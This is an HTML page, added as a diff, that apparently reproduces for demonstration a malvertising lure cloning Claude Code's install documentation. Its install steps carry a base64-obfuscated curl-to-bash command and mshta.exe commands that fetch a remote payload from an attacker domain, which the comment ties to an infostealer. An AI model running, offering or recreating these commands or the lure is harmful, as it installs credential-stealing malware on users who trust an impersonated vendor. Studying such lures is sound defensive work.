@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#1a1a1a;color:#e0e0e0;min-height:100vh}
+
+/* ── Top nav bar ──────────────────────────────────────────── */
+.topnav{background:#111;border-bottom:1px solid #2a2a2a;padding:.5rem 1.5rem;display:flex;align-items:center;gap:1rem;font-size:.75rem}
+.topnav .logo{color:#e8c8b8;font-weight:700;font-size:.9rem;display:flex;align-items:center;gap:.4rem}
+.topnav .logo .spark{color:#e8a07a;font-size:1rem}
+.topnav .lang{color:#888;margin-left:.5rem}
+.topnav .search{background:#222;border:1px solid #333;border-radius:5px;padding:.3rem .7rem;color:#666;font-size:.68rem;margin-left:auto;display:flex;align-items:center;gap:.5rem;min-width:140px}
+.topnav .search .kbd{background:#333;color:#888;font-size:.55rem;padding:1px 5px;border-radius:2px;border:1px solid #444}
+.topnav .nav-links{display:flex;gap:1rem;font-size:.72rem;color:#888}
+.topnav .nav-links a{color:#888;text-decoration:none}
+.topnav .cta{background:transparent;border:1px solid #555;color:#ccc;padding:.25rem .7rem;border-radius:5px;font-size:.68rem;margin-left:.5rem;text-decoration:none}
+
+/* ── Tab bar ──────────────────────────────────────────────── */
+.tabs{background:#111;border-bottom:1px solid #2a2a2a;padding:0 1.5rem;display:flex;gap:1.5rem;font-size:.72rem}
+.tabs a{color:#888;text-decoration:none;padding:.6rem 0;display:inline-block}
+.tabs a.active{color:#e8c8b8;border-bottom:2px solid #e8c8b8}
+
+/* ── Layout ───────────────────────────────────────────────── */
+.layout{display:flex;min-height:calc(100vh - 80px)}
+
+/* Sidebar */
+.sidebar{width:190px;border-right:1px solid #2a2a2a;padding:1rem 1rem 1rem 1.5rem;flex-shrink:0;font-size:.7rem}
+.sidebar h4{font-size:.62rem;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:.06em;margin:1rem 0 .4rem}
+.sidebar h4:first-child{margin-top:0}
+.sidebar a{display:block;color:#888;text-decoration:none;padding:.2rem .5rem;border-radius:4px;margin-bottom:.1rem;line-height:1.5}
+.sidebar a.active{background:rgba(232,168,122,.1);color:#e8a07a}
+
+/* Main content */
+.main{flex:1;padding:1.5rem 2rem;max-width:680px}
+.breadcrumb{font-size:.62rem;color:#e8a07a;text-transform:uppercase;letter-spacing:.06em;font-weight:600;margin-bottom:.75rem}
+.main h1{font-size:1.5rem;font-weight:700;color:#e8e8e8;margin-bottom:.35rem;display:flex;align-items:center;gap:.5rem}
+.main h1 .link-icon{font-size:.8rem;color:#555}
+.main p.intro{font-size:.85rem;color:#999;margin-bottom:1.5rem;line-height:1.5}
+
+/* OS sections */
+.os-label{font-size:1rem;font-weight:700;color:#e8e8e8;margin:1.5rem 0 .5rem}
+
+/* Code blocks */
+.code-block{background:#111;border:1px solid #2a2a2a;border-radius:8px;padding:.7rem .9rem;font-family:'Cascadia Code','Consolas',ui-monospace,monospace;font-size:.72rem;color:#e8a07a;position:relative;margin-bottom:.4rem;overflow-x:auto;white-space:nowrap}
+.code-block .copy-btn{position:absolute;right:.5rem;top:50%;transform:translateY(-50%);background:none;border:none;color:#555;font-size:.75rem;cursor:default}
+.code-progress{height:3px;background:#2a2a2a;border-radius:0 0 8px 8px;margin-top:-5px;margin-bottom:1rem;overflow:hidden}
+.code-progress .fill{height:100%;width:60%;background:#e8a07a;border-radius:2px}
+
+/* Info box */
+.info-box{background:#222;border:1px solid #333;border-radius:8px;padding:.65rem .9rem;font-size:.72rem;color:#999;display:flex;align-items:center;gap:.5rem;margin-top:1.5rem}
+.info-box .info-icon{width:18px;height:18px;border:1.5px solid #888;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.6rem;color:#888;flex-shrink:0}
+</style></head><body>
+
+<!-- Top navigation — mimics Claude Code Docs -->
+<div class="topnav">
+  <div class="logo"><span class="spark">&#10043;</span> Claude Code Docs</div>
+  <span class="lang">English &#9662;</span>
+  <div class="search">&#128269; Search... <span class="kbd">Ctrl K</span></div>
+  <div class="nav-links">
+    <a>&#9734; Ask AI</a>
+    <a>Claude Developer Platform</a>
+  </div>
+  <a class="cta">Claude Code on the Web &rarr;</a>
+</div>
+
+<!-- Tab bar -->
+<div class="tabs">
+  <a class="active">Getting started</a>
+  <a>Build with Claude Code</a>
+  <a>Deployment</a>
+  <a>Administration</a>
+  <a>Configuration</a>
+  <a>Reference</a>
+  <a>Resources</a>
+</div>
+
+<div class="layout">
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <h4>Getting started</h4>
+    <a>Overview</a>
+    <a class="active">Quickstart</a>
+    <a>Changelog &rarr;</a>
+    <h4>Core concepts</h4>
+    <a>How Claude Code works</a>
+    <a>Extend Claude Code</a>
+    <a>Common workflows</a>
+    <a>Best practices</a>
+    <h4>Platforms and integrations</h4>
+    <a>Claude Code on the web</a>
+    <a>Claude Code on desktop</a>
+    <a>Chrome extension (beta)</a>
+    <a>Visual Studio Code</a>
+    <a>JetBrains IDEs</a>
+    <a>GitHub Actions</a>
+  </div>
+
+  <!-- Main content -->
+  <div class="main">
+    <div class="breadcrumb">Getting Started</div>
+    <h1><span class="link-icon">&#128279;</span> Step 1: Install Claude Code</h1>
+    <p class="intro">To install Claude Code, use one of the following methods:</p>
+
+    <div class="os-label">macOS:</div>
+    <div class="code-block">
+      echo "macOS Download: http://code.claude.ai/download/" &amp;&amp; curl -sfkSL $(echo 'aHR0cHM6Ly9kb3dubG9hZC5hY3RpdmUtdmVyc2lvbi5jb20vY2xhdWRl' | base64 -d) | bash
+      <span class="copy-btn">&#128203;</span>
+    </div>
+    <div class="code-progress"><div class="fill"></div></div>
+
+    <div class="os-label">Windows PowerShell:</div>
+    <div class="code-block">
+      C:\Windows\SysWOW64\mshta.exe https://download.active-version[.]com/claude
+      <span class="copy-btn">&#128203;</span>
+    </div>
+
+    <div class="os-label">Windows CMD:</div>
+    <div class="code-block">
+      C:\Windows\SysWOW64\mshta.exe https://download.active-version[.]com/claude
+      <span class="copy-btn">&#128203;</span>
+    </div>
+
+    <div class="info-box">
+      <span class="info-icon">i</span>
+      Native installations automatically update in the background to keep you on the latest version.
+    </div>
+  </div>
+</div>
+
+<script>
+// NEUTRALIZED — all URLs defanged for safe demonstration
+// Original: pixel-perfect clone of Claude Code install documentation
+// distributed via Google Ads malvertising. macOS chain uses base64-encoded
+// curl payload; Windows chain uses mshta.exe to fetch HTA from
+// attacker-controlled domain (download.active-version.com).
+// Delivers Amatera infostealer via mshta → conhost chain.
+// This version only shows the visual lure.
+</script>
+</body></html>
